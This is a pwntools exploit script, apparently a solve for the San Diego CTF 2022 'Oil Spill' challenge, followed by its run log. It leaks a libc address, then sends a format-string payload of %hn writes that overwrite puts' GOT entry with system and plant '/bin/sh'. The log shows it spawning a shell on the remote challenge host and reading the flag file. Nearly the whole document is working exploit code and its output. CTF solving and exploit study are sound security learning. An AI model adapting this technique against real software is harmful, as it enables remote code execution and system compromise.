from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './OilSpill'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "oil.sdc.tf"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc

puts_addr   = int(s.recvuntil(",")[:-1], 16)
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
print "puts_addr =", hex(puts_addr)
print "libc_base =", hex(libc_base)

index = 8

a0 = system_addr&0xffff
a1 = (system_addr>>16)&0xffff
a2 = (system_addr>>32)&0xffff

b0 = u64("/bin/sh\x00")&0xffff
b1 = (u64("/bin/sh\x00")>>16)&0xffff
b2 = (u64("/bin/sh\x00")>>32)&0xffff
b3 = (u64("/bin/sh\x00")>>48)&0xffff

b3 = ((b3-b2-1) % 0x10000) + 1
b2 = ((b2-b1-1) % 0x10000) + 1
b1 = ((b1-b0-1) % 0x10000) + 1
b0 = ((b0-a2-1) % 0x10000) + 1
a2 = ((a2-a1-1) % 0x10000) + 1
a1 = ((a1-a0-1) % 0x10000) + 1
a0 = ((a0-1) % 0x10000) + 1
buf = "%%%dc%%%d$hn" % (a0, index+12)
buf += "%%%dc%%%d$hn" % (a1, index+13)
buf += "%%%dc%%%d$hn" % (a2, index+14)
buf += "%%%dc%%%d$hn" % (b0, index+15)
buf += "%%%dc%%%d$hn" % (b1, index+16)
buf += "%%%dc%%%d$hn" % (b2, index+17)
buf += "%%%dc%%%d$hn" % (b3, index+18)
buf += "-"*(8-len(buf)%8)
buf += p64(elf.got.puts)
buf += p64(elf.got.puts+2)
buf += p64(elf.got.puts+4)
buf += p64(elf.sym.x)
buf += p64(elf.sym.x+2)
buf += p64(elf.sym.x+4)
buf += p64(elf.sym.x+6)
pause()
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/San_Diego_CTF_2022/Pwn_Oil_Spill$ python solve.py r
[*] '/home/mito/CTF/San_Diego_CTF_2022/Pwn_Oil_Spill/OilSpill'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to oil.sdc.tf on port 1337: Done
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
puts_addr = 0x7fbb3ac93970
libc_base = 0x7fbb3ac13000

                                   $ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 12
-rwxr-xr-x 1 nobody nogroup 7728 May  5 21:58 OilSpill
-rw-r--r-- 1 nobody nogroup   34 Apr 29 18:41 flag.txt
$ cat flag.txt
sdctf{th4nks_f0r_S4V1nG_tH3_duCk5}
'''
